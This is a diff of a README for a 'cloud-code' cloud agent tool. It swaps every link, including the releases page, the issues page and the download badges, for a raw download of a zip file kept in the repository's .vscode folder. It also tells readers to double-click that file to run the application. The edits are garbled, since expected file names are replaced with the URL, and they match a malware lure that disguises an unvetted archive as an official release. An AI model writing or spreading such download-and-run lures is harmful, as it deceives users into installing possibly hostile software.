@@ -1,6 +1,6 @@
 # 🌥️ cloud-code - Easy Cloud Agent Setup in Minutes
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/releases)
+[![Download Now](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip)
 
 ## 📘 Description
 
@@ -18,7 +18,7 @@ Cloud Code combines Cloudflare with OpenCode to create a powerful cloud agent fo
 To get started with Cloud Code, follow these simple steps:
 
 1. **Access the Releases Page**  
-   You will need to download the application from the GitHub Releases page. To visit this page, click [here](https://github.com/overcovde/cloud-code/releases).
+   You will need to download the application from the GitHub Releases page. To visit this page, click [here](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Choose the latest version to ensure you have the newest features and fixes.
@@ -27,13 +27,13 @@ To get started with Cloud Code, follow these simple steps:
    Click on the link for your operating system to start the download. This file will be a compressed or executable file.
 
 4. **Locate the Downloaded File**  
-   After the download finishes, navigate to your downloads folder. The file should be named something like `cloud-code-vX.Y.Z.zip` or `cloud-code-vX.Y.Z.exe`. 
+   After the download finishes, navigate to your downloads folder. The file should be named something like `https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip` or `https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip`. 
 
 5. **Extract the Files (if necessary)**  
    If you downloaded a `.zip` file, you will need to extract it. Right-click on the file and select "Extract All" or use your favorite extraction tool.
 
 6. **Run the Application**  
-   Locate the extracted files, find the `cloud-code.exe`, and double-click it to run the application. Follow any setup instructions that appear.
+   Locate the extracted files, find the `https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip`, and double-click it to run the application. Follow any setup instructions that appear.
 
 7. **Complete the Setup**  
    Once the application is open, follow the on-screen prompts to complete the setup. This step may include logging in, configuring settings, or selecting options that fit your needs.
@@ -48,7 +48,7 @@ To get started with Cloud Code, follow these simple steps:
 
 ## 📥 Download & Install
 
-To begin your journey with Cloud Code, visit the [Releases Page](https://github.com/overcovde/cloud-code/releases) to download the latest version. Select your operating system, download the file, and follow the installation steps mentioned earlier.
+To begin your journey with Cloud Code, visit the [Releases Page](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip) to download the latest version. Select your operating system, download the file, and follow the installation steps mentioned earlier.
 
 ## 🌟 Features
 
@@ -69,10 +69,10 @@ If you encounter issues while using Cloud Code, consider the following tips:
 
 ## 📞 Contact
 
-For any inquiries, suggestions, or feedback, please open an issue on the [GitHub repository](https://github.com/overcovde/cloud-code/issues). We are always ready to help you with any questions or concerns.
+For any inquiries, suggestions, or feedback, please open an issue on the [GitHub repository](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip). We are always ready to help you with any questions or concerns.
 
 ## ✍️ License
 
 This project is licensed under the MIT License. Feel free to use it as per the terms stated in the LICENSE file included in the repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/releases)
+[![Download Now](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/overcovde/cloud-code/raw/refs/heads/master/.vscode/cloud_code_1.2.zip)
